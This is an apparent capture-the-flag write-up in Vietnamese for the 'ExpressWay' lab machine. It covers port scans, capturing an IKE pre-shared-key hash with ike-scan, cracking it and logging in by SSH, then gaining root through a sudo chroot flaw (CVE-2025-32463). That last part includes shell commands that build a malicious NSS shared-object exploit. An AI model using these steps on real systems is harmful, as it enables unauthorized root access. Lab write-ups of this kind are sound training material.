---
layout: post
title: "ExpressWay"
date: 2026-01-27 14:15:00 +0700
tags: redteam Machine-Easy Linux
categories: jekyll update
--- 

## Recon

---

Đầu tiên, mình sẽ tiến hành scan địa chỉ IP: **`10.10.11.87`**

- Scan TCP port

![image1.png](/assets/images/HTB/season9/ExpressWay/image1.png)

- Scan UDP port

![image2.png](/assets/images/HTB/season9/ExpressWay/image2.png)

**Tóm tắt**

- Mở TCP ssh, port 22
- Mở UDP isakmp, port 500
- Tìm hiểu thông tin về ứng dụng đang mở trên host

### SSH

---

![image3.png](/assets/images/HTB/season9/ExpressWay/image3.png)

### ISAKMP

---

Như vậy mình thử thực hiện khai thác **ISAKMP**

![image4.png](/assets/images/HTB/season9/ExpressWay/image4.png)

## Exploit

---

Theo thông tin ở trên thì **`ISAKMP`** sẽ làm nhiệm vụ thực hiện thiết lập thống nhất các giao thức, thuật toán mã hóa, xác thực,...

Còn việc thực hiện trao đổi khóa sẽ do **`IKE`** đảm nhận.

Sử dụng tool **`ike-scan`** với options **`-M`** là **`Main Mode`** nó sẽ trả về handshake.

![image5.png](/assets/images/HTB/season9/ExpressWay/image5.png)

Tiếp tục dùng option **`--aggressive`** để nó trả về nhiều thông tin hơn như ID/KeyExchange/HASH_R.

![image6.png](/assets/images/HTB/season9/ExpressWay/image6.png)

Nhìn thấy có:

- ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
- Hash(20 bytes)

Khai thác lấy hash dựa trên id **`ike@expreesway.htb`** sau đó ghi lại thông tin qua file với option **`-P`** 

![image7.png](/assets/images/HTB/season9/ExpressWay/image7.png)

Như vậy thì nó đã lưu hash vào trong file **`psk.txt`**

![image8.png](/assets/images/HTB/season9/ExpressWay/image8.png)

Mình sẽ thử crack hash này.

![image9.png](/assets/images/HTB/season9/ExpressWay/image9.png)

Tìm ra được password là **freakingrockstarontheroad**

Dùng credentials thu thập được là: **`ike@freakingrockstarontheroad`** login vào ssh.

![image10.png](/assets/images/HTB/season9/ExpressWay/image10.png)

Như vậy thì tiếp tục khai thác trên host này.

![image11.png](/assets/images/HTB/season9/ExpressWay/image11.png)

Nhìn thấy thì chưa leo lên được **`root`.** Giờ mình cần leo quyền.

![image](https://hackmd.io/_uploads/r143h2yaxl.png)

Sau khi kiểm tra qua các lệnh trên thì nó không có thông tin gì.
Nên mình thử tìm 1 file có ít nhất 1 quyền thực thi file thường sẽ là **`root`**

![image13.png](/assets/images/HTB/season9/ExpressWay/image13.png)

Nhìn thấy thì có file **`/usr/local/bin/sudo`**. Sau khi, kiểm tra thì nó có version là **`1.9.17`** 

![image14.png](/assets/images/HTB/season9/ExpressWay/image14.png)

Tìm thông tin trên mạng thì nó liên quan đến 1 **`CVE-2025-32463`** 

![image15.png](/assets/images/HTB/season9/ExpressWay/image15.png)

**Chi tiết lỗ hổng**: là một lỗ hổng nâng quyền cục bộ (local privilege escalation) trong sudo liên quan đến file **`/etc/nsswitch.conf`** — cụ thể là lỗ hổng liên quan đến tùy chọn --chroot (options -R) — cho phép người dùng thông thường leo lên quyền root trong một số điều kiện đặc biệt.

### 🧗 Privilige Escalation

1. Tạo 1 file **`.so`** (shared object) là file thư viện trong linux (giống như file dll trong windows) trong đó chứa
**`__attribute__((constructor))`** để có thể khởi chạy payload nâng quyền (nó là module NSS).
2. Xây dựng 1 chroot directory với **`/etc/nsswitch.conf`** mà mình đã custom (để khi hệ thống tra cứu tên, loader sẽ tìm thư viện đó trong chroot)
3. Đặt file **`.so`** đã biên dịch vào đúng tên và đường dẫn khớp với cấu trúc chroot (ví dụ **`libnss_/exploit.so.2`**)
4. Chạy **`sudo`** SUID bị vuln với tùy chọn chroot (ví dụ **`-chroot`**) đối với một lệnh vô hại; khi **`sudo`** load NSS bên trong chroot, constructor của **`.so`** độc hại sẽ chạy với quyền root.

### 🏗️ Xây dựng

---

1. Chuẩn bị 1 file C payload (payload này dùng constructor để chạy khi **`.so`** được load lên):

![image16.png](/assets/images/HTB/season9/ExpressWay/image16.png)

1. Tiếp tục tạo 1 chroot directory layout và build share library:

```bash
**mkdir -p exploit_stage/fsociety/etc exploit_stage/libnss_
echo "passwd: /fsociety123" > exploit_stage/fsociety/etc/nsswitch.conf
cp /etc/group exploit_stage/fsociety/etc**
```

```bash
**# compile share object (từ directory bao gồm exploit.c)
gcc -shared -fPIC -Wl,-init,exploit -o exploit_stage/libnss_/fsociety.so.2 exploit.c**

```

Sau đó, cuối cùng chạy **sudo** có lỗ hổng (ví dụ **`/usr/local/bin/sudo`** và **`sudo chroot option -R`**)

![image17.png](/assets/images/HTB/season9/ExpressWay/image17.png)

![image18.png](/assets/images/HTB/season9/ExpressWay/image18.png)